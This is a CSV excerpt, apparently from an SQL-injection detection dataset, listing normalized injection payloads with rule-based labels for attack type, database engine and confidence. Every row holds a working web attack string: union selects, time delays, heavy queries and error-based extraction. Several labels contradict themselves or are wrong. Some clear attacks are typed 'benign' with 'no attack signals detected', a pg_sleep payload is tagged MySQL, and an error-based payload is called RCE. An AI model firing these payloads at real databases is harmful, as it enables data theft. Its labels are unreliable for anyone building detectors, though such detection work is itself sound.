row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10260,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'bdsq' like 'bdsq",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
10261,"-8200' in boolean mode ) union all select 3360,3360--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10262,1%' ) or sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10263,"1'+ ( select 'lawc' where 1171 = 1171 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10264,1'|| ( select 'ypqa' where 1961 = 1961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10265,"-3767' ) as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10266,-1127 or 7391 = 4954,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10267,"1"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10268,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10269,"1 ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10270,-2154%' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and '%' = ',1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
10271,"-4317"" ) ) as nxvn where 2566 = 2566 union all select 2566,2566,2566#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10272,-9434' ) union all select 3106#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10273,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 8535 = 8535",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
10274,"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10275,select ( case when ( 8601 = 1220 ) then 8601 else 8601* ( select 8601 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10276,"1%' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( '%' = '",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10277,"1"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""umne"" like ""umne",1,,boolean_blind,firebird,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on firebird",rule-based
10278,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10279,"1%"" union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10280,1 where 3027 = 3027 and 4595 = 4595#,1,,boolean_blind,generic,0.95,3027 = 3027 and detected — boolean_blind injection (priority 8) on generic,rule-based
10281,"1 ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 3326 = 3326",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10282,"1"" ) and elt ( 4249 = 4249,7259 ) and ( ""xgka"" like ""xgka",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10283,"1"" ) where 7588 = 7588 waitfor delay '0:0:5'--",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
